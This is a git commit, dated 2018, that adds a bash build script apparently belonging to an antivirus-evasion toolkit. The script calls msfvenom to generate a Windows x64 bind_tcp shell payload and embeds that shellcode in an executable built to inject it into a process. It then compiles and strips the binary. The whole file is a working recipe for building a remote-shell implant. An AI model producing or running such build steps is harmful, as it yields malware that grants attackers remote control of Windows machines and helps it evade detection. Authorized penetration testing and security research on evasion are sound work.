a985862e7a457d8414f9500781fac8c65bf53cd0
Daniel Sauder <daniel.sauder@web.de>
2018-03-03 17:55:01 +0100

    build script for 64bit shellcode injection

---
+++ build/build_win64_bind_tcp_inject_shellcode.sh
@@ -0,0 +1,18 @@
+#!/bin/bash          
+# example script for injecting shellcode into a process
+# include script containing the compiler var $win32_compiler
+# you can edit the compiler in build/global_win32.sh
+# or enter $win32_compiler="mycompiler" here
+. build/global_win64.sh
+# payload 
+#msfvenom -p windows/x64/shell/bind_tcp -e x64/xor -f c --platform Windows > sc.txt
+msfvenom -p windows/x64/shell/bind_tcp -b '\x00' -f c -a x64 --platform Windows ExitFunc=thread > sc.txt
+# clean defs.h
+echo "" > defs.h
+# call make_bfg, compile shellcode into the executable
+./make_bfg -f sc.txt -i shellcode -P
+# compile 
+$win64_compiler -o bfg.exe bfg.c
+strip bfg.exe
+# cleanup
+#rm sc.txt && echo "" > defs.h
